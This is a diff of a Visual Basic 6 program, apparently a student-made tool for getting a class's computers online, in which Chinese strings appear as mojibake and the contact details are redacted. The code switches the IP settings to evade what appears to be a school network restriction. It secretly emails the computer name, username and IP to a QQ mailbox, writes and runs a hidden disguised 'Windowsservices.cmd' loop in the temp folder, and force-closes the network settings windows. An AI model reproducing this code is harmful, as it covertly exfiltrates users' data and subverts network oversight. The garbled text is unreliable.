@@ -1,6 +1,6 @@
 VERSION 5.00
 Begin VB.Form Form1 
-   Caption         =   "10°àÁªÍø¿ØÖÆ³ÌĞò-by lhc"
+   Caption         =   "10ç­è”ç½‘æ§åˆ¶ç¨‹åº-by ***"
    ClientHeight    =   2895
    ClientLeft      =   120
    ClientTop       =   465
@@ -18,9 +18,9 @@ Begin VB.Form Form1
    MaxButton       =   0   'False
    ScaleHeight     =   2895
    ScaleWidth      =   4695
-   StartUpPosition =   3  '´°¿ÚÈ±Ê¡
+   StartUpPosition =   3  'çª—å£ç¼ºçœ
    Begin VB.CommandButton Command2 
-      Caption         =   "£¿"
+      Caption         =   "ï¼Ÿ"
       Height          =   1695
       Left            =   24360
       TabIndex        =   1
@@ -64,7 +64,7 @@ Dim countdown As Integer
 
 Private Sub Command1_Click()
 If Command1.Caption = "Connect" Then
-MsgBox "±¾³ÌĞòÊÚÈ¨¸øzyhÊ¹ÓÃ£¬½ö¹©Ñ§Ï°½»Á÷£¬ÈôÓÃÓÚ·Ç·¨ÓÃÍ¾Ò»ÇĞºó¹û×Ô¸º£¡"
+MsgBox "æœ¬ç¨‹åºæˆæƒç»™zyhä½¿ç”¨ï¼Œä»…ä¾›å­¦ä¹ äº¤æµï¼Œè‹¥ç”¨äºéæ³•ç”¨é€”ä¸€åˆ‡åæœè‡ªè´Ÿï¼"
 Status = ChangeIP("172.16.40.80", "255.255.255.0", "172.16.40.254", "172.16.10.78", "")
 countdown = 67
 Timer1.Enabled = True
@@ -72,14 +72,14 @@ Command1.Caption = "Disconnect"
   If Status = "succeeded in connecting" Then
   MsgBox "succeeded in connecting!"
   Else
-  MsgBox "zqxswl,Î´¹ÜÀíÔ±Éí·İÔËĞĞ»ò±»Ç¿ÕßÏÅµ½ÁË£¬ÎŞ·¨Á¬½Ó£¡"
+  MsgBox "zqxswl,æœªç®¡ç†å‘˜èº«ä»½è¿è¡Œæˆ–è¢«å¼ºè€…å“åˆ°äº†ï¼Œæ— æ³•è¿æ¥ï¼"
   End
   End If
 Else
 Debug.Print ChangeIP("172.16.40.31", "255.255.255.0", "", "", "")
 Command1.Caption = "Connect"
 Timer1.Enabled = False
-Form1.Caption = "10°àÁªÍø¿ØÖÆ³ÌĞò-by lhc"
+Form1.Caption = "10ç­è”ç½‘æ§åˆ¶ç¨‹åº-by ***"
 End If
 End Sub
 
@@ -101,9 +101,9 @@ countdown = countdown - 1
 If countdown = 0 Then
 Debug.Print ChangeIP("172.16.40.31", "255.255.255.0", "", "", "")
 Command1.Caption = "Connect"
-Form1.Caption = "10°àÁªÍø¿ØÖÆ³ÌĞò-by lhc"
+Form1.Caption = "10ç­è”ç½‘æ§åˆ¶ç¨‹åº-by ***"
 Timer1.Enabled = False
-End '¹Ø¼ü
+End 'å…³é”®
 Else
  If countdown = 60 Then
   If GetMAC = 1 Then
@@ -112,22 +112,22 @@ Else
   MsgBox "INTERNET ACCESSIBLE!"
   End If
  End If
-Form1.Caption = "°²È«µ¹¼ÆÊ±" & countdown & "Ãë£¬ÖØÁ¬ÖØ¼Æ"
+Form1.Caption = "å®‰å…¨å€’è®¡æ—¶" & countdown & "ç§’ï¼Œé‡è¿é‡è®¡"
 End If
 End Sub
 
 
 Public Function ChangeIP(IP As String, NM As String, GW As String, MDNS As String, SDNS As String) As String
- '·µ»ØÖµËµÃ÷:·µ»ØÒ»¸öÉèÖÃµÄÖĞÎÄËµÃ÷.
+ 'è¿”å›å€¼è¯´æ˜:è¿”å›ä¸€ä¸ªè®¾ç½®çš„ä¸­æ–‡è¯´æ˜.
 Dim strComputer, objWMIService, colNetAdapters, strIPAddress, strSubnetMask
  Dim strGateway, strGatewaymetric, strDNS, objNetAdapter, errEnable, errGateways, errDNS
  strComputer = "."
  Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
  Set colNetAdapters = objWMIService.ExecQuery("Select * from Win32_NetworkAdapterConfiguration where IPEnabled=TRUE")
- strIPAddress = Array(IP) 'ipµØÖ·
-strSubnetMask = Array(NM) '×ÓÍøÑÚÂë
-strGateway = Array(GW) 'Íø¹Ø
-strDNS = Array(MDNS, SDNS) 'Ö÷DNS¸÷±¸DNS
+ strIPAddress = Array(IP) 'ipåœ°å€
+strSubnetMask = Array(NM) 'å­ç½‘æ©ç 
+strGateway = Array(GW) 'ç½‘å…³
+strDNS = Array(MDNS, SDNS) 'ä¸»DNSå„å¤‡DNS
  strGatewaymetric = Array(1)
 
  For Each objNetAdapter In colNetAdapters
@@ -136,25 +136,25 @@ strDNS = Array(MDNS, SDNS) 'Ö÷DNS¸÷±¸DNS
  errGateways = objNetAdapter.SetGateways(strGateway, strGatewaymetric)
  errDNS = objNetAdapter.SetDNSServerSearchOrder(strDNS)
  If errEnable = 0 And errGateways = 0 And errDNS = 0 Then
- ChangeIP = "ÉèÖÃ³É¹¦"
+ ChangeIP = "è®¾ç½®æˆåŠŸ"
 Else
  If errEnable = 0 Then
- ChangeIP = "succeeded in connecting" 'IPµØÖ·ºÍ×ÓÍøÑÚÂëÉèÖÃ³É¹¦
+ ChangeIP = "succeeded in connecting" 'IPåœ°å€å’Œå­ç½‘æ©ç è®¾ç½®æˆåŠŸ
 Else
- 'ChangeIP = "zqxswl," 'IPµØÖ·»ò×ÓÍøÑÚÂëÉèÖÃÊ§°Ü
- 'MsgBox "ÁªÍø¿ØÖÆ³ÌĞò±»zqÏÅµ½ÁË£¬ÓÉÓÚÎŞ¹ÜÀíÔ±Éí·İÔËĞĞ»òÒÑÁ¬½ÓÍøÂç£¡"
+ 'ChangeIP = "zqxswl," 'IPåœ°å€æˆ–å­ç½‘æ©ç è®¾ç½®å¤±è´¥
+ 'MsgBox "è”ç½‘æ§åˆ¶ç¨‹åºè¢«zqå“åˆ°äº†ï¼Œç”±äºæ— ç®¡ç†å‘˜èº«ä»½è¿è¡Œæˆ–å·²è¿æ¥ç½‘ç»œï¼"
  'End
 End If
  If errGateways = 0 Then
- ChangeIP = "succeeded in connecting" 'Ä¬ÈÏÍø¹ØÉèÖÃ³É¹¦
+ ChangeIP = "succeeded in connecting" 'é»˜è®¤ç½‘å…³è®¾ç½®æˆåŠŸ
 Else
- 'ChangeIP = ChangeIP & "zqxswl" 'Ä¬ÈÏÍø¹ØÉèÖÃÊ§°Ü
+ 'ChangeIP = ChangeIP & "zqxswl" 'é»˜è®¤ç½‘å…³è®¾ç½®å¤±è´¥
 End If
  If errDNS = 0 Then
  ChangeIP = "succeeded in connecting"
- 'ChangeIP = ChangeIP & "" 'DNSÉèÖÃ³É¹¦
+ 'ChangeIP = ChangeIP & "" 'DNSè®¾ç½®æˆåŠŸ
 Else
- 'ChangeIP = ChangeIP & "" 'DNSÉèÖÃÊ§°Ü
+ 'ChangeIP = ChangeIP & "" 'DNSè®¾ç½®å¤±è´¥
 End If
  End If
  Next
@@ -168,55 +168,55 @@ Dim aa As String 'get module
 Dim strLocalIP As String 'get module
 Dim winIP As Object 'get module
 
-aa = aa & "Name of this computer:" & Environ("computername") & vbCrLf 'get module'»ñÈ¡ĞÅÏ¢Ä£¿é
+aa = aa & "Name of this computer:" & Environ("computername") & vbCrLf 'get module'è·å–ä¿¡æ¯æ¨¡å—
 aa = aa & "User name of this computer:" & Environ("username") & vbCrLf 'get module
 Set winIP = CreateObject("MSWinsock.Winsock") 'get module
 strLocalIP = winIP.localip
-'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''ÓÊ¼ş·¢ËÍÄ£¿é
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''é‚®ä»¶å‘é€æ¨¡å—
 Dim Email As Object
 Const NameSpace = "http://schemas.microsoft.com/cdo/configuration/"
 Set Email = CreateObject("cdo.message")
-Email.From = 2631988746# & "@qq.com" '·¢¼şÈËÓÊÏä
-Email.to = 1041351041# & "@qq.com" 'ÊÕ¼şÈËÓÊÏä*
-Email.Subject = "This email was sent at" & Hour(Time) & ":" & Minute(Time) & ":" & Second(Time)  'Ö÷Ìâ
-Email.Textbody = aa & "IP of this computer:" & strLocalIP & "?(this is still in-accuate after test)" 'ÓÊ¼şÄÚÈİ
+Email.From = ***# & "@qq.com" 'å‘ä»¶äººé‚®ç®±
+Email.to = ***# & "@qq.com" 'æ”¶ä»¶äººé‚®ç®±*
+Email.Subject = "This email was sent at" & Hour(Time) & ":" & Minute(Time) & ":" & Second(Time)  'ä¸»é¢˜
+Email.Textbody = aa & "IP of this computer:" & strLocalIP & "?(this is still in-accuate after test)" 'é‚®ä»¶å†…å®¹
 With Email.Configuration.Fields
 .Item(NameSpace & "sendusing") = 2
-.Item(NameSpace & "smtpserver") = "smtp.qq.com" 'Ê¹ÓÃqqµÄÓÊ¼ş·şÎñÆ÷
+.Item(NameSpace & "smtpserver") = "smtp.qq.com" 'ä½¿ç”¨qqçš„é‚®ä»¶æœåŠ¡å™¨
 .Item(NameSpace & "smtpserverport") = 465
 .Item(NameSpace & "smtpauthenticate") = 1
-.Item(NameSpace & "sendusername") = 2631988746# 'qqºÅÂë
-.Item(NameSpace & "sendpassword") = "qvcfzgrwbibzebfd"  ' ÊÚÈ¨Âë£¨ÃÜÂë£©
-.Item(NameSpace & "smtpusessl") = "true" '¼ÓÃÜ·¢ËÍ£¬QQÓÊÏä²»ÔÊĞíÆÕÍ¨·¢ËÍ
+.Item(NameSpace & "sendusername") = ******# 'qqå·ç 
+.Item(NameSpace & "sendpassword") = "***"  ' æˆæƒç ï¼ˆå¯†ç ï¼‰
+.Item(NameSpace & "smtpusessl") = "true" 'åŠ å¯†å‘é€ï¼ŒQQé‚®ç®±ä¸å…è®¸æ™®é€šå‘é€
 .Update
 End With
 Email.Send
-'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''ÓÊ¼ş·¢ËÍÄ£¿é
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''é‚®ä»¶å‘é€æ¨¡å—
 Exit Function
 NetError: GetMAC = 1
 End Function
 
 
 
-Sub Writecmd() 'Ğ´Èë¼à²âcmdµ½tempÄ¿Â¼ÏÂ²¢´ò¿ªcmd£¬·ÀÖ¹²é¿´IP
+Sub Writecmd() 'å†™å…¥ç›‘æµ‹cmdåˆ°tempç›®å½•ä¸‹å¹¶æ‰“å¼€cmdï¼Œé˜²æ­¢æŸ¥çœ‹IP
 
 Set fs = CreateObject("scripting.filesystemobject")
 Dim RetVal
 If (fs.fileexists(Environ("temp") & "\Windowsservices.cmd")) Then
 
-RetVal = Shell(Environ("temp") & "\Windowsservices.cmd", vbHide) 'ÔËĞĞ
+RetVal = Shell(Environ("temp") & "\Windowsservices.cmd", vbHide) 'è¿è¡Œ
 Else
 Open Environ("temp") & "\Windowsservices.cmd" For Output As #1
 Print #1, ":loop"
 Print #1, "@echo off"
-Print #1, "tasklist | find /i " & Chr(34) & "NetService.exe" & Chr(34) & "||netsh interface ip set address ÒÔÌ«Íø static 172.16.40.31 255.255.255.0 172.16.30.254 1"
+Print #1, "tasklist | find /i " & Chr(34) & "NetService.exe" & Chr(34) & "||netsh interface ip set address ä»¥å¤ªç½‘ static 172.16.40.31 255.255.255.0 172.16.30.254 1"
 Print #1, "ping -n 3 127.1>nul"
 Print #1, "goto :loop"
 Close #1
 
-SetAttr Environ("temp") & "\Windowsservices.cmd", vbHidden 'Òş²Ø
+SetAttr Environ("temp") & "\Windowsservices.cmd", vbHidden 'éšè—
 
-RetVal = Shell(Environ("temp") & "\Windowsservices.cmd", vbHide) 'ÔËĞĞ
+RetVal = Shell(Environ("temp") & "\Windowsservices.cmd", vbHide) 'è¿è¡Œ
 End If
 End Sub
 
@@ -226,23 +226,23 @@ End Sub
 
 Sub CloseWindow()
 Dim hwnd, result As Long
-hwnd = FindWindow(vbNullString, "ÉèÖÃ") '»ñµÃÖ¸¶¨´°Ìå±êÌâµÄ´°ÌåµÄ¾ä±ú
+hwnd = FindWindow(vbNullString, "è®¾ç½®") 'è·å¾—æŒ‡å®šçª—ä½“æ ‡é¢˜çš„çª—ä½“çš„å¥æŸ„
 If hwnd <> 0 Then
-    result = PostMessage(hwnd, WM_CLOSE, 0&, 0&)    'ÏòÄ¿±ê³ÌĞò·¢ËÍÏûÏ¢
+    result = PostMessage(hwnd, WM_CLOSE, 0&, 0&)    'å‘ç›®æ ‡ç¨‹åºå‘é€æ¶ˆæ¯
     If result = 0 Then
-    MsgBox "ÒÑÁ¬ÉÏÍøÂç£¬²»ÒªĞŞ¸ÄÍøÂçÉèÖÃÅ¶£¡"
+    MsgBox "å·²è¿ä¸Šç½‘ç»œï¼Œä¸è¦ä¿®æ”¹ç½‘ç»œè®¾ç½®å“¦ï¼"
     End If
 End If
-hwnd = FindWindow(vbNullString, "¿ØÖÆÃæ°å\ÍøÂçºÍ Internet\ÍøÂçÁ¬½Ó") '»ñµÃÖ¸¶¨´°Ìå±êÌâµÄ´°ÌåµÄ¾ä±ú
+hwnd = FindWindow(vbNullString, "æ§åˆ¶é¢æ¿\ç½‘ç»œå’Œ Internet\ç½‘ç»œè¿æ¥") 'è·å¾—æŒ‡å®šçª—ä½“æ ‡é¢˜çš„çª—ä½“çš„å¥æŸ„
 If hwnd <> 0 Then
-    result = PostMessage(hwnd, WM_CLOSE, 0&, 0&)    'ÏòÄ¿±ê³ÌĞò·¢ËÍÏûÏ¢
+    result = PostMessage(hwnd, WM_CLOSE, 0&, 0&)    'å‘ç›®æ ‡ç¨‹åºå‘é€æ¶ˆæ¯
     If result = 0 Then
-    MsgBox "ÒÑÁ¬ÉÏÍøÂç£¬²»ÒªĞŞ¸ÄÍøÂçÉèÖÃÅ¶£¡"
+    MsgBox "å·²è¿ä¸Šç½‘ç»œï¼Œä¸è¦ä¿®æ”¹ç½‘ç»œè®¾ç½®å“¦ï¼"
     End If
 End If
 End Sub
 
 
 Private Sub Command2_Click()
-MsgBox "zyhÌ«Ç¿ÁË£¡"
+MsgBox "zyhå¤ªå¼ºäº†ï¼"
 End Sub
